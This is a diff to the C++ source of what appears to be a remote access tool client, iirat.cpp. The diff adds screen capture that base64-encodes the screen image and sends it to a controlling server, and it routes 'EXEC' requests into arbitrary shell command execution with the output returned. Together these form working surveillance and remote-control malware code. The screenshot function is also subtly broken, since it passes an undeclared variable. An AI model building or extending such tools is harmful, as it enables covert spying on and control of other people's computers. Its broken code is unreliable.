@@ -2,7 +2,7 @@
 * @Author: amaneureka
 * @Date:   2017-04-02 03:33:49
 * @Last Modified by:   amaneureka
-* @Last Modified time: 2017-04-04 19:33:46
+* @Last Modified time: 2017-04-05 23:55:01
 */
 
 #include <vector>
@@ -11,12 +11,13 @@
 #include <iostream>
 #include <pthread.h>
 #include <fstream>
+#include <sstream>
 
 using namespace std;
 
 #if __WIN__
 
-    /* g++ -std=gnu++0x -U__STRICT_ANSI__ iirat.cpp -D__WIN__ */
+    /* g++ -std=gnu++0x -U__STRICT_ANSI__ iirat.cpp -D__WIN__ -lgdi32 */
 
     /* supporting win 7 or later only */
     #define WINVER _WIN32_WINNT_WIN7
@@ -170,7 +171,7 @@ void register_device(int socket, string recv_uid)
     write(socket, uid.c_str(), uid.size());
 }
 
-int execute_cmd(int socket, const string cmd)
+void execute_cmd(int socket, const string cmd)
 {
     FILE *pPipe;
     char buffer[128] = "RSP-1";
@@ -180,7 +181,7 @@ int execute_cmd(int socket, const string cmd)
     if (pPipe == NULL)
     {
         write(socket, buffer, 5);
-        return -1;
+        return;
     }
 
     string str;
@@ -191,18 +192,64 @@ int execute_cmd(int socket, const string cmd)
     }
 
     pclose(pPipe);
-
-    return 0;
+    return;
 }
 
-void GetScreenShot(void)
+const char BASE64_CODE[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+void convert_and_send(int socket, void *mem, int size)
+{
+    int index = 3;
+    char buffer[500] = "RSP";
+    BYTE* data = (BYTE*)mem;
+    for (int i = 0; i < size; i += 3)
+    {
+        if (index >= 450)
+        {
+            write(socket, buffer, index);
+            index = 3;
+        }
+
+        int d = data[i];
+        buffer[index++] = BASE64_CODE[d >> 2];
+        d = (d & 0x3) << 4;
+        if (i + 1 < size)
+        {
+            d |= data[i + 1] >> 4;
+            buffer[index++] = BASE64_CODE[d];
+
+            d = (data[i + 1] & 0xF) << 2;
+            if (i + 2 < size)
+            {
+                d |= data[i + 2] >> 6;
+                buffer[index++] = BASE64_CODE[d];
+                buffer[index++] = BASE64_CODE[data[i + 2] & 0x3F];
+            }
+            else
+            {
+                buffer[index++] = BASE64_CODE[d];
+                buffer[index++] = '=';
+            }
+        }
+        else
+        {
+            buffer[index++] = BASE64_CODE[d];
+            buffer[index++] = '=';
+        }
+    }
+
+    if (index > 3)
+        write(socket, buffer, index);
+}
+
+void GetScreenShot(int socket)
 {
     BYTE* memory;
+    string str, tmp;
     BITMAPINFO info;
     HGDIOBJ old_obj;
     HBITMAP hBitmap;
     HDC hScreen, hDC;
-    int width, height;
+    int width, height, bytes;
     BITMAPINFOHEADER infoHeader;
 
     /* get screen dimensions */
@@ -232,11 +279,8 @@ void GetScreenShot(void)
     old_obj = SelectObject(hDC, hBitmap);
     BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);
 
-    /* save bitmap to clipboard */
-    OpenClipboard(NULL);
-    EmptyClipboard();
-    SetClipboardData(CF_BITMAP, hBitmap);
-    CloseClipboard();
+    bytes = (((24*width + 31) & (~31))/8)*height;
+    convert_and_send(socket, memory, size);
 
     /* clean up */
     SelectObject(hDC, old_obj);
@@ -247,10 +291,8 @@ void GetScreenShot(void)
 
 int main(int argc, char *argv[])
 {
-    size_t size;
-    int sock, len;
+    int sock;
     string cmd, req;
-    char *line = NULL;
     vector<char> buffer(4096);
     struct sockaddr_in addr;
     fd_set active_fd_set, read_fd_set;
@@ -360,10 +402,15 @@ int main(int argc, char *argv[])
                     {
                         printf("[CMD] \'%s\'\n", req.c_str());
 
-                        /* command to execute */
-                        int status = execute_cmd(sock, cmd.substr(3));
+                        req = cmd.substr(3, 4);
 
-                        if (status) printf("\tFailed!\n");
+                        if (req == "SSCR")
+                            /* get screenshot */
+                            GetScreenShot(sock);
+
+                        else if (req == "EXEC")
+                            /* command to execute */
+                            execute_cmd(sock, cmd.substr(7));
                     }
                 }
             }
